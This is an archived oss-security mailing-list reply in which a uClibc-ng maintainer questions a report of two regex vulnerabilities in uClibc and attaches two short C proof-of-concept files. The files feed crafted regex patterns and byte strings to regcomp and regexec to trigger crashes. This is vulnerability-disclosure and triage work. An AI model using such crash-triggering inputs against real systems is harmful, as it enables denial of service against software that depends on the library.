X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1673" "Friday" "23" "June" "2017" "23:20:41" "+0200" "Waldemar Brodkorb" "wbx@uclibc-ng.org" "<20170623212041.GT26922@waldemar-brodkorb.de>" "73" "Re: [oss-security] two vulns in  uClibc-0.9.33.2" "^Cc:" nil nil "6" "2017062321:20:41" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        wbx@uclibc-n Jun 23   73/1673  " thread-indent "\"Re: [oss-security] two vulns in  uClibc-0.9.33.2\"\n") "<tencent_453378A5461E2AE54D551FA1@qq.com>" ("<tencent_453378A5461E2AE54D551FA1@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14231 invoked by uid 550); 23 Jun 2017 21:55:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3967 invoked from network); 23 Jun 2017 21:20:52 -0000
Message-ID: <20170623212041.GT26922@waldemar-brodkorb.de>
References: <tencent_453378A5461E2AE54D551FA1@qq.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="CD/aTaZybdUisKIc"
Content-Disposition: inline
In-Reply-To: <tencent_453378A5461E2AE54D551FA1@qq.com>
X-Operating-System: Linux 3.16.0-4-amd64 x86_64
User-Agent: Mutt/1.5.23 (2014-03-12)
Cc: Peter Korsgaard <peter@korsgaard.com>,
	"Anthony G. Basile" <basile@freeharbor.net>,
	oss-security <oss-security@lists.openwall.com>
Date: Fri, 23 Jun 2017 23:20:41 +0200
From: Waldemar Brodkorb <wbx@uclibc-ng.org>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] two vulns in  uClibc-0.9.33.2
To: fefe <qbenjin@qq.com>

--CD/aTaZybdUisKIc
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline

Hi,
fefe wrote,

> >> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
> 
> >uClibc is dead. Active development happens on uClibc-ng. Is uClibc-ng
> also affected by these issues?
> 
> 
> uclibc_ng is also affected.
 
I tried to cross-compile attached code and run it in
qemu-system-arm.

What should be the result?

I see a segfault for poc2.c. But this also happens with glibc
based system.

Is the complete app code just plain wrong?
Can you provide full application code and the results showing the
issue?

best regards
 Waldemar

--CD/aTaZybdUisKIc
Content-Type: text/x-csrc; charset=utf-8
Content-Disposition: attachment; filename="poc1.c"

#include <sys/types.h>
#include <regex.h>

int main() {

   regex_t regtmp;

   if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
        {               
                regmatch_t pmatch[1];
                regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
                regfree(&regtmp);
        }

}

--CD/aTaZybdUisKIc
Content-Type: text/x-csrc; charset=utf-8
Content-Disposition: attachment; filename="poc2.c"

#include <sys/types.h>
#include <regex.h>

int main() {

   regex_t regtmp;

if(regcomp 
(&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD",
 REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
        {               
                regmatch_t pmatch[1];
                regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
                regfree(&regtmp);
        }

}

--CD/aTaZybdUisKIc--
